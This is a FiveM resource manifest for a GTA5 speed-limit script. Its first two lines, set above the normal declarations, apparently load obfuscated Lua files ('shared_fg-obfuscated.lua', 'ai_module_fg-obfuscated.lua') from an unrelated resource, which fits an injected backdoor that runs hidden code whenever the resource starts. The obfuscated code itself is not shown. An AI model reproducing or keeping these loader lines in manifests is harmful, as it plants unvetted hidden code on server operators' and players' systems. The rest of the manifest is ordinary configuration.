shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

fx_version 'cerulean'
games { 'gta5' }
author 'ELUSED'
description 'SPEEDLIMIT'
version 'V1'
-- What to run
client_scripts {
    'client.lua'
}
shared_scripts {
	'config.lua',
}
lua54 'yes'

escrow_ignore {
    'config.lua'
  }